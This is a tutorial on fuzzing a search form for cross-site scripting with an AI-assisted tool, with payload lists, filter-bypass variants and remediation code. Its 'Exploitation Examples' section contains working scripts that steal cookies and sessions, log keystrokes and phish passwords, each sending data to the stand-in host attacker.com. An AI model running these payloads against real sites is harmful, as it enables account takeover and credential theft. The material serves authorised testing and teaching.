# Tutorial: Fuzzing for XSS with AI Payloads

## Overview

This tutorial demonstrates how to use Blitz to discover Cross-Site Scripting (XSS) vulnerabilities using AI-powered payload generation and classification.

**Learning Objectives:**
- Understand XSS vulnerability types
- Use AI to generate context-aware XSS payloads
- Detect payload reflection and execution
- Validate and exploit XSS findings
- Generate professional reports

**Prerequisites:**
- Blitz installed and configured
- Basic understanding of HTML and JavaScript
- Permission to test the target application

**Time Required:** 25 minutes

## What is Cross-Site Scripting?

Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

**XSS Types:**

1. **Reflected XSS:** Payload is reflected in the immediate response
2. **Stored XSS:** Payload is stored server-side and executed for all users
3. **DOM-based XSS:** Payload executes via client-side JavaScript manipulation

**Impact:**
- Session hijacking (cookie theft)
- Phishing attacks
- Key logging
- Defacement
- Malware distribution

## Scenario: Testing a Search Form

### Target Application

We have a search feature at `http://blog.example.com/search` that displays results in HTML.

### Step 1: Capture the Request

**Captured Request:**

```http
GET /search?q=security&page=1 HTTP/1.1
Host: blog.example.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
```

### Step 2: Create Request Template

Save to `search-template.txt`:

```http
GET /search?q={{search_query}}&page={{page_num}} HTTP/1.1
Host: blog.example.com
User-Agent: Mozilla/5.0
Accept: text/html
```

**Markers:**
- `{{search_query}}` - Primary XSS injection point
- `{{page_num}}` - Secondary injection point (less likely but possible)

### Step 3: Basic XSS Testing

**Create XSS payload file** (`xss-payloads.txt`):

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<div onmouseover=alert(1)>hover
<img src=x onerror="alert('XSS')">
<svg><script>alert(1)</script></svg>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
"><script>alert(String.fromCharCode(88,83,83))</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
--><script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**Run Blitz:**

```bash
0xgenctl blitz run \
  --template search-template.txt \
  --payload @xss-payloads.txt \
  --attack-type sniper \
  --concurrency 5 \
  --output xss-test.db
```

**Expected Output:**

```
[*] Starting Blitz fuzzer...
[*] Session ID: blitz-20250113-234567
[*] Total jobs: 40 (2 positions × 20 payloads)

[+] Baseline: Status 200, Length 3421
[+] Anomaly! Payload: <script>alert(1)</script>, Status: 200, Length: 3445 (+24)
[+] Anomaly! Payload: <img src=x onerror=alert(1)>, Status: 200, Length: 3465 (+44)
[+] Anomaly! Payload: <svg onload=alert(1)>, Status: 200, Length: 3442 (+21)

Progress: 40/40 (100%) | RPS: 5.0 | Found 8 anomalies
```

### Step 4: Analyze Reflection

XSS requires that the payload is **reflected** in the response. Query for reflected payloads:

```bash
sqlite3 xss-test.db "
  SELECT
    id,
    payload,
    status_code,
    content_len,
    CASE
      WHEN response_body LIKE '%' || payload || '%' THEN 'REFLECTED'
      ELSE 'NOT REFLECTED'
    END as reflection
  FROM results
  WHERE anomaly_interesting = 1;
"
```

**Sample Output:**

```
id|payload|status_code|content_len|reflection
3|<script>alert(1)</script>|200|3445|REFLECTED
7|<img src=x onerror=alert(1)>|200|3465|REFLECTED
11|<svg onload=alert(1)>|200|3442|REFLECTED
```

✅ **Good sign!** Payloads are reflected, indicating potential XSS.

### Step 5: Manual Verification

**Test in Browser:**

1. Open `http://blog.example.com/search?q=<script>alert(1)</script>`
2. Check if alert executes
3. Inspect page source to see if payload is in HTML

**Using curl:**

```bash
curl "http://blog.example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E" | grep -C 5 "script"
```

**Expected Response:**

```html
<div class="search-results">
  <h2>Search Results for: <script>alert(1)</script></h2>
  <p>No results found for '<script>alert(1)</script>'.</p>
</div>
```

✅ **Confirmed XSS!** The script tag is reflected without encoding.

## AI-Powered XSS Discovery

Now let's use AI to automatically generate and detect XSS payloads.

### Step 1: Run with AI Features

```bash
0xgenctl blitz run \
  --template search-template.txt \
  --ai-payloads \
  --ai-classify \
  --ai-findings \
  --findings-output xss-findings.jsonl \
  --attack-type sniper \
  --output xss-ai-test.db
```

**What AI Does:**

1. **Context Analysis:**
   - Detects `Accept: text/html` header → HTML context
   - Parameter name `search_query` → User input reflection likely
   - Infers XSS is a high-priority vulnerability to test

2. **Payload Generation:**
   - Generates XSS payloads appropriate for HTML context
   - Includes modern bypass techniques
   - Tests various event handlers and tags

3. **Response Classification:**
   - Detects reflected payloads
   - Identifies script tags in responses
   - Flags potential XSS with confidence scores

**Output:**

```
[*] Starting Blitz with AI features...
[*] AI analyzing request...
[*] Detected HTML context (Accept: text/html)
[*] Parameter 'search_query' likely reflects user input
[*] Selected vulnerability categories: xss, injection
[*] Generated 52 context-aware XSS payloads

[+] Baseline: Status 200, Length 3421

[+] Anomaly! Payload: <script>alert(document.domain)</script>
[!] AI Classification: xss_reflection (confidence: 0.95)
[!] Evidence: <script>alert(document.domain)</script> found in response
[!] Finding created: finding-xss-001

[+] Anomaly! Payload: <img src=x onerror=alert(1)>
[!] AI Classification: xss_reflection (confidence: 0.90)
[!] Finding created: finding-xss-002

Progress: 52/52 (100%) | Findings: 5 | Completed
```

### Step 2: Review AI Findings

```bash
cat xss-findings.jsonl | jq '.'
```

**Example Finding:**

```json
{
  "version": "1.0",
  "id": "finding-xss-001",
  "plugin": "blitz",
  "type": "blitz.xss_reflection",
  "message": "XSS payload reflected in response - Cross-Site Scripting vulnerability",
  "target": "http://blog.example.com/search?q={{search_query}}&page=1",
  "evidence": "Payload: <script>alert(document.domain)</script> (payload reflected)\n\nMatched Pattern: <script>alert\n\nResponse Preview: <h2>Search Results for: <script>alert(document.domain)</script></h2>",
  "severity": "medium",
  "detected_at": "2025-01-13T11:15:30Z",
  "metadata": {
    "blitz_session": "blitz-20250113-234567",
    "position": "search_query",
    "payload": "<script>alert(document.domain)</script>",
    "status_code": "200",
    "classification": "xss_reflection",
    "confidence": "0.95",
    "cwe": "CWE-79",
    "owasp": "A03:2021-Injection",
    "vulnerability_type": "Cross-Site Scripting (XSS)",
    "poc_request": "GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&page=1 HTTP/1.1",
    "remediation": "Encode all user-supplied data before rendering in HTML. Use Content-Security-Policy headers."
  }
}
```

## Advanced XSS Scenarios

### Scenario 1: POST Request with JSON

**Target:**

```http
POST /api/comments HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"comment":"{{comment_text}}","author":"{{author_name}}"}
```

**AI Payload Generation:**

When AI detects JSON context, it generates payloads that:
1. Break out of JSON strings
2. Close JSON objects
3. Inject script tags

**Example AI Payloads:**

```json
</script><script>alert(1)</script>
","comment":"<script>alert(1)</script>
"}},{"comment":"<script>alert(1)</script>
\"><script>alert(1)</script>
```

**Command:**

```bash
0xgenctl blitz run \
  --template comment-request.txt \
  --ai-payloads \
  --ai-classify \
  --attack-type sniper
```

### Scenario 2: Attribute Context XSS

Sometimes input is reflected inside an HTML attribute:

**Vulnerable Response:**

```html
<input type="text" value="USER_INPUT">
```

**AI-Generated Payloads for Attribute Context:**

```html
" onload=alert(1) x="
" onfocus=alert(1) autofocus x="
" onmouseover=alert(1) x="
'><script>alert(1)</script>
"></input><script>alert(1)</script>
```

### Scenario 3: JavaScript Context XSS

Input reflected inside `<script>` tags:

**Vulnerable Code:**

```html
<script>
var searchQuery = "USER_INPUT";
</script>
```

**AI Payloads:**

```javascript
"; alert(1); //
'; alert(1); //
</script><script>alert(1)</script>
\";alert(1);//
```

### Scenario 4: URL Context XSS

Input reflected in `href` or `src` attributes:

**Vulnerable HTML:**

```html
<a href="USER_INPUT">Click here</a>
```

**AI Payloads:**

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)
```

## Context-Aware Payload Generation

Blitz's AI analyzes multiple factors to generate appropriate payloads:

### HTML Context Indicators

- `Content-Type: text/html`
- `Accept: text/html`
- Parameter names: `comment`, `message`, `text`, `query`, `search`

**Generated Payloads:**
- Script tags: `<script>alert(1)</script>`
- Event handlers: `<img src=x onerror=alert(1)>`
- HTML5 tags: `<svg onload=alert(1)>`

### JavaScript Context Indicators

- Response contains `<script>` tags
- Parameter appears in JavaScript code
- Content-Type: `application/javascript`

**Generated Payloads:**
- String breakout: `"; alert(1); //`
- Script injection: `</script><script>alert(1)</script>`
- Template literals: `${alert(1)}`

### Attribute Context Indicators

- Input typically rendered in HTML attributes
- Common patterns detected in baseline

**Generated Payloads:**
- Quote breakout: `" onload=alert(1) "`
- Tag breakout: `"><script>alert(1)</script>`
- Event handler injection: `" onfocus=alert(1) autofocus "`

### JSON Context Indicators

- `Content-Type: application/json`
- Request body is JSON

**Generated Payloads:**
- JSON breakout: `"}]}<script>alert(1)</script>`
- Property injection: `","xss":"<script>alert(1)</script>`

## Bypassing Filters

AI-generated payloads include common bypass techniques:

### Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### Tag Breaking

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<<SCRIPT>alert(1)//<</SCRIPT>
```

### Encoded Payloads

```html
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

### Event Handler Variations

```html
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### Alternative Tags

```html
<svg><animate onbegin=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

## Exploitation Examples

Once XSS is confirmed, demonstrate impact:

### Cookie Theft

```javascript
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
```

### Session Hijacking

```javascript
<script>
new Image().src='https://attacker.com/log?session=' + encodeURIComponent(document.cookie);
</script>
```

### Keylogger

```javascript
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/keys?k=' + e.key);
};
</script>
```

### Phishing

```javascript
<script>
document.body.innerHTML = '<h1>Session Expired</h1><form action="https://attacker.com/phish"><input name="user"><input type="password" name="pass"><button>Login</button></form>';
</script>
```

### DOM Manipulation

```javascript
<script>
document.querySelector('#admin-panel').style.display = 'block';
</script>
```

## Validation Checklist

✅ **Confirm Reflection**
- Payload appears in HTML source
- Check with browser DevTools

✅ **Verify Execution**
- Alert box appears
- Console shows no errors

✅ **Test Across Browsers**
- Chrome, Firefox, Safari, Edge
- Different versions

✅ **Check Context**
- HTML, JavaScript, Attribute, URL
- Determines exploitation method

✅ **Assess Impact**
- Can steal cookies?
- Can hijack sessions?
- Affects which users?

## Remediation

### Developer Fixes

**1. Output Encoding (Essential)**

```python
# Python Flask
from flask import escape

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Encode before rendering
    return f"<h1>Results for: {escape(query)}</h1>"
```

```javascript
// Node.js
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});
```

**2. Content Security Policy**

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

**3. HTTPOnly Cookies**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

**4. Input Validation**

```python
import re

def validate_search_query(query):
    # Only allow alphanumeric + spaces
    if not re.match(r'^[a-zA-Z0-9\s]*$', query):
        raise ValueError("Invalid search query")
    return query
```

**5. Framework-Level Protection**

```javascript
// React (auto-escapes by default)
function SearchResults({ query }) {
  return <h1>Results for: {query}</h1>;
}

// Angular (auto-escapes by default)
<h1>Results for: {{ query }}</h1>

// Vue (auto-escapes by default)
<h1>Results for: {{ query }}</h1>
```

## Best Practices

### Testing

1. **Test all input points:** Query params, POST body, headers, cookies
2. **Test different contexts:** HTML, JavaScript, Attribute, URL
3. **Use multiple payloads:** Different tags, events, encodings
4. **Verify with browser:** Not just curl
5. **Check stored XSS:** Test if payload persists

### Reporting

Include in your XSS report:

- **Location:** Exact parameter/field
- **Type:** Reflected, Stored, or DOM-based
- **Context:** HTML, JavaScript, Attribute
- **Payload:** Working exploit code
- **PoC:** Step-by-step reproduction
- **Impact:** Cookie theft, session hijacking, etc.
- **Remediation:** Specific fix recommendations
- **Severity:** Based on exploitability and impact

### Ethical Considerations

⚠️ **DO NOT:**
- Test without permission
- Exploit real user accounts
- Steal actual session cookies
- Deface production sites

✅ **DO:**
- Get written authorization
- Use `alert()` for PoC
- Report responsibly
- Follow disclosure timelines

## Generating Reports

### HTML Report

```bash
0xgenctl blitz export \
  --session xss-ai-test.db \
  --format html \
  --filter anomaly \
  --output xss-report.html
```

### CSV for Analysis

```bash
0xgenctl blitz export \
  --session xss-ai-test.db \
  --format csv \
  --output xss-results.csv
```

### JSON for Automation

```bash
0xgenctl blitz export \
  --session xss-ai-test.db \
  --format json \
  --filter anomaly \
  --output xss-anomalies.json
```

## Troubleshooting

### No XSS Detected

If Blitz doesn't find XSS:

1. **Check if input is reflected:**
   ```bash
   sqlite3 xss-test.db "SELECT payload FROM results LIMIT 5"
   ```
   Then manually search responses for these payloads

2. **Try different contexts:** Attribute, JavaScript, URL

3. **Use encoding:** URL-encode, HTML-encode, Unicode

4. **Test DOM-based XSS:** Check client-side JavaScript

5. **Review CSP:** May block inline scripts

### False Positives

1. **Verify execution:** Not just reflection
2. **Check encoding:** May be safely encoded
3. **Browser testing:** Confirm in actual browser
4. **Review CSP:** May prevent exploitation

## Summary

In this tutorial, you learned:

✅ Create XSS request templates
✅ Use AI to generate context-aware XSS payloads
✅ Detect payload reflection with AI classification
✅ Validate XSS vulnerabilities manually
✅ Demonstrate exploitation impact
✅ Provide remediation guidance
✅ Generate professional reports

## Next Steps

- [Blitz User Guide](./USER_GUIDE.md)
- [Tutorial: Finding SQL Injection](./TUTORIAL_SQLI.md)
- [API Documentation](./API_DOCS.md)

## Additional Resources

- **OWASP XSS:** https://owasp.org/www-community/attacks/xss/
- **CWE-79:** https://cwe.mitre.org/data/definitions/79.html
- **PortSwigger XSS Cheat Sheet:** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- **PayloadsAllTheThings XSS:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

---

**Happy Hunting! 🎯**
